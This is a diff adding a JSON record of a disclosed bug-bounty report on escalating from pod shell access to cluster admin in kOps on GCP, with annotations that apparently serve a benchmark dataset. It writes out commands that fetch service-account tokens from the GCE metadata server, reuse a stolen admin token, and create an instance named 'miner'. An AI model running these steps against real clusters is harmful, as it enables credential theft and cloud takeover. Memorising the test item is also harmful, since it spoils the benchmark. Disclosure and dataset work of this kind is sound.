@@ -1,0 +1,72 @@
+{
+    "reported_to": "Kubernetes",
+    "reported_by": "jpts ",
+    "title": "Privilege Escalation in kOps using GCE/GCP Provider",
+    "content": "\nSummary:\nWhen using kOps with the GCP provider, it is possible for a user with shell access to any pod, to escalate their privileges to cluster admin. During provisioning of the cluster, kOps gives all nodes access to the state storage bucket through the service account associated with the instance. Any user with shell access can request the service account credentials, and read sensitive information from the state store. Using this information, the user can privesc to cluster admin, compromising the entire cluster. It is further possible to compromise a privileged GCP service account associated with the control-plane nodes and takeover other resources in the GCP project.\nKubernetes Version:\nKubernetes: v1.25.5\nComponent Version:\nkOps: v1.25.3\nSteps To Reproduce:\nCluster Setup:\nThe test cluster was setup as close to the getting started guide as possible.\nCode 371 Bytes\n1export KOPS_STATE_STORE=gs://kops-state-test/\n2export PROJECT=`gcloud config get-value project`\n3\n4gsutil mb $KOPS_STATE_STORE\n5kops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2\n6kops update cluster --name kops.k8s.local --yes --admin\n7kops validate cluster --wait 10m\nPrivesc\nAdd a demo container in which user is allow shell access (manifest attached): k apply -f shell.yaml\nGive ourselves a shell: k exec -it shell-5d64dd647c-8l8s6 -it -- ash\npod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token\n\nk cp shell-5d64dd647c-8l8s6:/default.token default.token\ngcloud auth revoke\n\nmkdir -p keys\n\ncd keys\n\nexport KUBECONFIG=./pwn.kconfig\n\nCheck we are cluster-admin k auth can-i '*' '*' -A\nDeploy a pod on the master node (example manifest included), make sure to edit to the correct node name k apply -f shell-master.yaml\nGive ourselves a shell: k exec -it shell-78d66f6f7c-ft7ch -it -- ash\npod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token\nk cp shell-78d66f6f7c-ft7ch:/admin.token admin.token\nexport CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./admin.token)\ngcloud compute instances create miner --image-family=ubuntu-2204-lts --zone=europe-west1-b --image-project=ubuntu-os-cloud\nSupporting Material/References:\nshell.yaml - basic alpine deployment to simulator a user with shell access\nshell-master.yaml - similar simple deployment, targeting a master node\ncsr.json - used to configure cfssl to generate the malicious system:masters mTLS certs\nauth-can-i.png - proof we have cluster admin\nminer.png - proof we can spin up arbitrary instances\nKubernetes Engine Service Agent Role\nTools used\nhttps://github.com/cloudflare/cfssl\nhttps://github.com/mikefarah/yq\nImpact\nOnce the attacker has compromised the cluster, they have access to all cluster resources. This includes any secrets/data stored by the cluster and also any secrets/data that is accessible by any GCP service accounts in use by the cluster. As the attacker is able to compromise the cluster, they can compromise the master nodes. In GCE kOps, the master node service accounts have the \"Kubernetes Engine Service Agent\" role, which is highly permissive, and would likely allow the compromise of other resources in the GCP project. Since the role has compute create permissions, it could also be abused for attacks such as crypto-mining.\n\n",
+    "severity": [
+        8.0,
+        null
+    ],
+    "bounty": 2500,
+    "weaknesses": [
+        "Privilege Escalation"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1691191440,
+    "report_url": "https://hackerone.com/reports/1842829",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Set up a kOps cluster on GCP following the standard guide"
+        ],
+        [
+            2,
+            "Deploy a pod with shell access in the cluster"
+        ],
+        [
+            3,
+            "Access the pod's shell and retrieve the default service account token from the GCE metadata server"
+        ],
+        [
+            4,
+            "Use the token to authenticate and access the kOps state storage bucket"
+        ],
+        [
+            5,
+            "Retrieve sensitive cluster information from the state store"
+        ],
+        [
+            6,
+            "Use the information to escalate privileges to cluster admin"
+        ],
+        [
+            7,
+            "Deploy a pod on a master node to access the master service account token"
+        ],
+        [
+            8,
+            "Use the master service account token to create arbitrary GCP resources"
+        ]
+    ],
+    "vuln_description": "The vulnerability allows a user with shell access to any pod in a kOps-managed GCP cluster to escalate privileges to cluster admin by accessing the GCE metadata service to retrieve service account tokens. These tokens can then be used to access the kOps state storage bucket, retrieve sensitive cluster information, and further escalate privileges to compromise the entire cluster and potentially other GCP resources.",
+    "reason": "The attack involves multiple components (GCE metadata service, kOps state storage, Kubernetes RBAC) and requires understanding how kOps manages state and permissions in GCP. However, the steps to exploit are relatively straightforward once the initial access is obtained, and the interaction between components is not particularly subtle or novel.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": false,
+        "authnz_byppass_detectable": true
+    }
+}
